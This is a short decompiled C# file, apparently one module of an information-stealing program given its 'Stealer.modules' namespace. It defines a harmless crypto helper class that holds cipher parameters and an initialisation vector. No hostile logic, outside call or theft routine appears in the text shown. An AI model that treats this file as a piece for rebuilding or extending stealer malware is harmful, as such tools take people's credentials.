using System;

namespace Stealer.modules
{
	// Token: 0x02000009 RID: 9
	public class ParametersWithIV : ICipherParameters
	{
		// Token: 0x17000001 RID: 1
		// (get) Token: 0x06000026 RID: 38 RVA: 0x00002AB4 File Offset: 0x00000CB4
		public ICipherParameters Parameters
		{
			get
			{
				return this.parameters;
			}
		}

		// Token: 0x06000027 RID: 39 RVA: 0x00002ABC File Offset: 0x00000CBC
		public ParametersWithIV(ICipherParameters parameters, byte[] iv) : this(parameters, iv, 0, iv.Length)
		{
		}

		// Token: 0x06000028 RID: 40 RVA: 0x00002ACC File Offset: 0x00000CCC
		public ParametersWithIV(ICipherParameters parameters, byte[] iv, int ivOff, int ivLen)
		{
			if (parameters == null)
			{
				throw new ArgumentNullException("parameters");
			}
			if (iv == null)
			{
				throw new ArgumentNullException("iv");
			}
			this.parameters = parameters;
			this.iv = new byte[ivLen];
			Array.Copy(iv, ivOff, this.iv, 0, ivLen);
		}

		// Token: 0x06000029 RID: 41 RVA: 0x00002B1F File Offset: 0x00000D1F
		public byte[] GetIV()
		{
			return (byte[])this.iv.Clone();
		}

		// Token: 0x04000007 RID: 7
		private readonly ICipherParameters parameters;

		// Token: 0x04000008 RID: 8
		private readonly byte[] iv;
	}
}
